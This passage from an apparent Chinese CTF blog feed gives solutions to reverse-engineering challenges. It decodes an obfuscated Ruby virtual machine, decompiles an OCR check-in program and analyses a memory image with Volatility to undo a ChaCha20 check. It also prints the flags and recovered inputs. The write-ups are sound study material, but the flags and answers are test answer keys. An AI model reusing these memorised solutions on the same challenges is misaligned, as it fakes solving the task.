class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">begin</span>&nbsp;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$</span>/<span class="hljs-variable">$$</span>;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">@_</span>=<span class="hljs-variable">$_</span>+<span class="hljs-variable">$_</span>;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">$-</span>_=<span class="hljs-variable">$_</span>-<span class="hljs-variable">@_</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">$__</span>=-&gt;_{_==[]<span class="hljs-params">||</span>_==<span class="hljs-string">''</span><span class="hljs-string">?$</span>.<span class="hljs-symbol">:</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$__</span>[_[<span class="hljs-variable">$_</span>..<span class="hljs-variable">$-</span>_]]}&nbsp;<span class="hljs-comment">#len</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">@__</span>=-&gt;_,&amp;__{_==[]<span class="hljs-string">?[</span>]<span class="hljs-symbol">:</span>[__[_[<span class="hljs-variable">$.</span>]]]+<span class="hljs-variable">@__</span>[_[<span class="hljs-variable">$_</span>..<span class="hljs-variable">$-</span>_],&amp;__]}</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">$_____</span>=-&gt;_{<span class="hljs-variable">@__</span>[[*_],&amp;-&gt;__{__[<span class="hljs-variable">$.</span>]}]}</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">@_____</span>=-&gt;_{<span class="hljs-variable">@__</span>[[*_],&amp;-&gt;__{__[<span class="hljs-variable">$-</span>_]}]}</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">$______</span>=-&gt;_{___,______=<span class="hljs-variable">$_____</span>[_],<span class="hljs-variable">@_____</span>[_];_____=<span class="hljs-variable">$__</span>[___];____={};__=<span class="hljs-variable">$.</span>;(_=-&gt;{</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____[______[__]]=___[__];(__+=<span class="hljs-variable">$_</span>)==_____&nbsp;<span class="hljs-string">?_</span><span class="hljs-symbol">___:</span>_[]})[]}</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">@______</span>=-&gt;_,__{_=[*_]+[*__];____=<span class="hljs-variable">$__</span>[_];___={};__=<span class="hljs-variable">$.</span>;(_____=-&gt;{</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;___[_[__][<span class="hljs-variable">$.</span>]]=_[__][<span class="hljs-variable">$_</span>];(__+=<span class="hljs-variable">$_</span>)==____&nbsp;<span class="hljs-string">?_</span><span class="hljs-symbol">__:</span>_____[]})[]}</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">$_______</span>=-&gt;_{<span class="hljs-variable">$___</span>=[];<span class="hljs-variable">@___</span>=<span class="hljs-variable">$__</span>[_];__=___=____=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$____</span>,<span class="hljs-variable">@____</span>={},[]</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;(_____=-&gt;{</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_[____]==<span class="hljs-string">'5'</span><span class="hljs-string">?(</span><span class="hljs-variable">@____</span>&lt;&lt;____)<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_[____]==<span class="hljs-string">'6'</span><span class="hljs-string">?(</span><span class="hljs-variable">$____</span>[<span class="hljs-variable">@____</span>[<span class="hljs-variable">$-</span>_]]=____;<span class="hljs-variable">@____</span>=<span class="hljs-variable">@____</span>[<span class="hljs-variable">$.</span>..<span class="hljs-variable">$.</span>-<span class="hljs-variable">@_</span>])<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(____+=<span class="hljs-variable">$_</span>)==<span class="hljs-variable">@__</span>_?<span class="hljs-variable">$.</span><span class="hljs-symbol">:_____[]</span>})[]</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">$____</span>=<span class="hljs-variable">$____</span>=={}<span class="hljs-string">?{</span>}<span class="hljs-symbol">:</span><span class="hljs-variable">@______</span>[<span class="hljs-variable">$____</span>,<span class="hljs-variable">$______</span>[<span class="hljs-variable">$____</span>]]</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;puts(<span class="hljs-variable">$____</span>);</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">#&nbsp;puts(@____);</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;(______=-&gt;{</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">#&nbsp;puts(_[__])</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;_[__]==</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'0'</span><span class="hljs-string">?(</span><span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$___</span>[___]+=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'1'</span><span class="hljs-string">?(</span><span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$___</span>[___]-=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'2'</span><span class="hljs-string">?(</span><span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$___</span>[___]=STDIN.getc.ord)<span class="hljs-symbol">:_</span>[__]==</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'3'</span><span class="hljs-string">?(</span>___+=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'4'</span><span class="hljs-string">?(</span>___-=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'5'</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)==<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>____[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'6'</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)!=<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>____[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'7'</span><span class="hljs-string">?(</span><span class="hljs-variable">$&gt;</span>&lt;&lt;(<span class="hljs-string">''</span>&lt;&lt;<span class="hljs-variable">$___</span>[___]))<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;(__+=<span class="hljs-variable">$_</span>)==<span class="hljs-variable">@__</span>_?<span class="hljs-symbol">_:</span>______[]})[]}</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-variable">$_______</span>[<span class="hljs-stringspan>];<span class="hljs-keyword">rescue</span>&nbsp;Exception;<span class="hljs-keyword">end</span></span><br></pre></td></tr></tbody></table></figure><p>虚拟机，按指令运行，5和6之间进行循环，读取一下指令</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">op=<span class="hljs-stringspan></span><br><span class="line"><span class="hljs-keyword">for</span>&nbsp;i&nbsp;<span class="hljs-keyword">in</span>&nbsp;op:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;i==<span class="hljs-string">'0'</span>:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">print</span>(<span class="hljs-string">"stack[idx]+=1"</span>)</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">elif</span>&nbsp;i==<span class="hljs-string">'1'</span>:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">print</span>(<span class="hljs-string">"stack[idx]-=1"</span>)</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">elif</span>&nbsp;i==<span class="hljs-string">'2'</span>:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">print</span>(<span class="hljs-string">"stack[idx]=getch()"</span>)</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">elif</span>&nbsp;i==<span class="hljs-string">'3'</span>:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">print</span>(<span class="hljs-string">"idx++"</span>)</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">elif</span>&nbsp;i==<span class="hljs-string">'4'</span>:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">print</span>(<span class="hljs-string">"idx--"</span>)</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">elif</span>&nbsp;i==<span class="hljs-string">'5'</span>:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">print</span>(<span class="hljs-string">"while&nbsp;stack[idx]!=0:"</span>)</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">elif</span>&nbsp;i==<span class="hljs-string">'6'</span>:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">print</span>(<span class="hljs-string">"end&nbsp;while"</span>)</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">elif</span>&nbsp;i==<span class="hljs-string">'7'</span>:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">print</span>(<span class="hljs-string">"puts(stack[idx])"</span>)</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">else</span>:</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">print</span>(<span class="hljs-string">'error!!!!!'</span>)</span><br></pre></td></tr></tbody></table></figure><p>之后分析解析的指令，使用这种方式进行输出</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">stack[idx]+=8</span><br><span class="line">while stack[idx]!=0:</span><br><span class="line">idx--</span><br><span class="line">stack[idx]+=9</span><br><span class="line">idx++</span><br><span class="line">stack[idx]-=1</span><br><span class="line">end while</span><br><span class="line">idx--</span><br><span class="line">stack[idx]+=1</span><br><span class="line">puts(stack[idx])</span><br></pre></td></tr></tbody></table></figure><p>前几段代码输出Input:<br>之后进行输入并验证，验证方法时进行循环，如果循环可以正常结束则最终会输出ok，如果不能则异常结束，没有输出</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">stack[idx]=getch()</span><br><span class="line">idx++</span><br><span class="line">stack[idx]=0</span><br><span class="line">idx++</span><br><span class="line">stack[idx]=0</span><br><span class="line">stack[idx]+=7</span><br><span class="line">while stack[idx]!=0:</span><br><span class="line">idx--</span><br><span class="line">stack[idx]+=11</span><br><span class="line">idx++</span><br><span class="line">stack[idx]-=1</span><br><span class="line">end while</span><br><span class="line"></span><br><span class="line">idx--</span><br><span class="line">while stack[idx]!=0:</span><br><span class="line">idx--</span><br><span class="line">stack[idx]-=1</span><br><span class="line">idx++</span><br><span class="line">stack[idx]-=1</span><br><span class="line">end while</span><br><span class="line">#ch-77</span><br><span class="line">idx--</span><br><span class="line">while stack[idx]!=0:</span><br><span class="line">idx+=2</span><br><span class="line">stack[idx]=0</span><br><span class="line">idx++</span><br><span class="line">stack[idx]=0</span><br><span class="line">idx-=4</span><br><span class="line">stack[idx]=0</span><br><span class="line">idx+=3</span><br><span class="line">while stack[idx]!=0:</span><br><span class="line">idx++</span><br><span class="line">stack[idx]+=1</span><br><span class="line">idx-=4</span><br><span class="line">stack[idx]+=1</span><br><span class="line">idx+=3</span><br><span class="line">stack[idx]-=1</span><br><span class="line">end while</span><br><span class="line">idx++</span><br><span class="line">while stack[idx]!=0:</span><br><span class="line">idx--</span><br><span class="line">stack[idx]+=1</span><br><span class="line">idx++</span><br><span class="line">stack[idx]-=1</span><br><span class="line">end while</span><br><span class="line">idx-=3</span><br><span class="line">stack[idx]=0</span><br><span class="line">end while</span><br><span class="line">stack[idx]=0</span><br></pre></td></tr></tbody></table></figure><p>每一个循环都这样处理，循环本身是跑不出来的，所以成功的条件就是ch-77为0，不会进入循环，对于每一个循环都会得到一个数，一共5个输入，得到M5Ya7，测试成功，计算md5即可</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021年“春秋杯”新年欢乐赛</title>
      <link href="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
      <url>/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这次的赛制是第一次见到的沙漏赛制，对我这种不急不忙佛系做题的不是很友好，最后的名次也还行，前排观赏前面的神仙打架<br><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/2769833766.png" alt="result2.png"></p><span id="more"></span><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>程序是python打包出来的，解包找到主程序checkin，补上pyc头文件，反编译得到python代码</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> cv2, re, sys</span><br><span class="line"><span class="hljs-keyword">from</span> aip <span class="hljs-keyword">import</span> AipOcr</span><br><span class="line"><span class="hljs-keyword">from</span> apii <span class="hljs-keyword">import</span> APP_ID, API_KEY, SECRECT_KEY, flag</span><br><span class="line">client = AipOcr(APP_ID, API_KEY, SECRECT_KEY)</span><br><span class="line">cap = cv2.VideoCapture(<span class="hljs-number">0</span>)</span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line">x = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">'\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⣄⣀⢀⣀⣀⡀⠀⠀⠀⢀⣄⣀⣀⣀⣀⡀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡤⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢀⣹⣉⣝⢸⡇⠀⠀⠀⠀⢀⡞⠉⠉⣹⠉⠉⠁⠀⠀⢠⢼⢦⠐⢺⠓⢲⠀⠀⠀⠀⣾⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⡤⣤⠤⢸⡏⢹⠉⠀⠀⠀⢸⡏⠉⢹⠉⠉⠁⠀⠀⠘⢸⠠⠤⢼⡤⠼⠤⠀⠀⠀⠛⡒⠒⡗⢒⠒⠂⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢀⠇⠀⠰⣸⠀⢸⠀⠀⠀⠈⠉⠉⠉⢻⠉⠉⠉⠀⠀⠀⢸⠀⣠⠏⠱⣄⠀⠀⠀⢀⡴⠁⠀⡇⠈⠳⡄⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠘⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠘⠘⠁⠀⠀⠈⠃⠀⠀⠈⠀⠈⠉⠁⠀⠀⠀⠀⠀\n'</span>)</span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    cv2.imshow(<span class="hljs-string">'capture'</span>, frame)</span><br><span class="line">    cv2.imwrite(<span class="hljs-string">'.\\i'</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">'.png'</span>, frame)</span><br><span class="line">    i = i + <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">if</span> i - <span class="hljs-number">1</span> &gt; x:</span><br><span class="line">        z = <span class="hljs-built_in">open</span>(<span class="hljs-string">'.\\i'</span> + <span class="hljs-built_in">str</span>(x) + <span class="hljs-string">'.png'</span>, <span class="hljs-string">'rb'</span>)</span><br><span class="line">        img = z.read()</span><br><span class="line">        message = client.basicGeneral(img)</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> message.get(<span class="hljs-string">'words_result'</span>):</span><br><span class="line">            words = message[<span class="hljs-string">'words_result'</span>]</span><br><span class="line">            num_list = []</span><br><span class="line">            <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> words:</span><br><span class="line">                num_list.append(s[<span class="hljs-string">'words'</span>])</span><br><span class="line">                final = num_list</span><br><span class="line">                final = <span class="hljs-string">''</span>.join(final)</span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-string">'FUN'</span> <span class="hljs-keyword">in</span> final:</span><br><span class="line">                    <span class="hljs-built_in">print</span>(flag)</span><br><span class="line">                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'flag.txt'</span>, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">                    f.write(flag)</span><br><span class="line">                    f.close()</span><br><span class="line">                    sys.exit(<span class="hljs-number">0</span>)</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    <span class="hljs-built_in">print</span>(<span class="hljs-string">'识别失败'</span>)</span><br><span class="line">                    sys.exit(<span class="hljs-number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            x = x + <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> cv2.waitKey(<span class="hljs-number">1</span>) &amp; <span class="hljs-number">255</span> == <span class="hljs-built_in">ord</span>(<span class="hljs-string">'q'</span>):</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">cap.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></tbody></table></figure><p>看了一下代码，有OCR，发现真的和题目描述一样对着电脑摄像头扫“FUN”就可以了，然后放弃继续逆向写了个大大的FUN扫出来得到flag<code>flag{ju5t_f0r_FUN}</code></p><h2 id="evilMem"><a href="#evilMem" class="headerlink" title="evilMem"></a>evilMem</h2><p>拿到vmem文件先用volatility查一下imageinfo</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/3172205591.png" alt="evilMem-1.png"></p><p>Win7SP1x86</p><p>然后查一下进程列表</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f image.vmem --profile=Win7SP1x86 pslist</span><br></pre></td></tr></tbody></table></figure><p>发现进程</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x858e1030 EvilImage.exe          1884   3516      1        7      1      0 2021-01-17 16:33:41 UTC+0000</span><br></pre></td></tr></tbody></table></figure><p>把进程内存dump出来</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f image.vmem --profile=Win7SP1x86 memdump -p 1884 -D evilimage/</span><br></pre></td></tr></tbody></table></figure><p>dump出来的内存用foremost恢复一下，恢复出来的文件太多，大多是系统进程，没什么太大的研究价值，根据时间找到两个可疑文件</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">28</span>:<span class="hljs-number">00000608</span>.exe       <span class="hljs-number">16</span> KB      <span class="hljs-number">311296</span>  <span class="hljs-number">01</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2021</span> <span class="hljs-number">16</span>:<span class="hljs-number">28</span>:<span class="hljs-number">19</span></span><br><span class="line"><span class="hljs-attribute">29</span>:<span class="hljs-number">00000672</span>.dll       <span class="hljs-number">13</span> KB      <span class="hljs-number">344064</span>  <span class="hljs-number">01</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2021</span> <span class="hljs-number">16</span>:<span class="hljs-number">28</span>:<span class="hljs-number">19</span></span><br></pre></td></tr></tbody></table></figure><p>修复一下程序segment的raw offset，反编译一下，发现exe文件时主程序EvilImage.exe，dll文件是调用的evil.dll</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/1172812708.png" alt="evilMem-2.png"></p><p>没有修复IAT，但是并不影响理解程序，这里没有太多的内容，只是调用一下Evil.dll里面的checkflag函数判断一下输入的flag是否正确就可以了</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/4170854745.png" alt="evilMem-3.png"></p><p>加密过程中出现了很明显的特征“expand 32-byte k”，很容易判断出来是chacha20，v8-v14进行密钥初始化，iv经过if判断条件的计算也可以很轻松地算出来，最后的加密结果也在内存中可以直接读取，解这个密码没有什么难度</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> binascii</span><br><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20</span><br><span class="line"><span class="hljs-keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">keys = [<span class="hljs-number">0xAA0F37A3</span>, <span class="hljs-number">0x214FF178</span>, <span class="hljs-number">0x6FF0CC56</span>, <span class="hljs-number">0x4B65E511</span>, <span class="hljs-number">0x2F60906D</span>, <span class="hljs-number">0xCA638692</span>, <span class="hljs-number">0xA001E464</span>, <span class="hljs-number">0x2BE81780</span>]</span><br><span class="line">key = <span class="hljs-string">b''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> keys:</span><br><span class="line">    key += struct.pack(<span class="hljs-string">'&lt;I'</span>, i)</span><br><span class="line">secret = key</span><br><span class="line"></span><br><span class="line">iv = struct.pack(<span class="hljs-string">'&lt;I'</span>, <span class="hljs-number">0x6E7568D7</span> - <span class="hljs-number">0x74</span>) + struct.pack(<span class="hljs-string">'&lt;I'</span>, (<span class="hljs-number">0x217569D6</span> - <span class="hljs-number">0x65</span>))</span><br><span class="line"><span class="hljs-built_in">print</span>(iv)</span><br><span class="line"></span><br><span class="line">msg = <span class="hljs-string">'EE2AC08F12AF33C5D1133E75C88AADBC3D0200246522037E72623311FC838FB6'</span></span><br><span class="line">msg = binascii.unhexlify(msg)</span><br><span class="line">msg_nonce = iv</span><br><span class="line">ciphertext = msg</span><br><span class="line">cipher = ChaCha20.new(key=secret, nonce=msg_nonce)</span><br><span class="line">plaintext = cipher.decrypt(ciphertext)</span><br><span class="line"><span class="hljs-built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># b'chunqiu!'</span></span><br><span class="line"><span 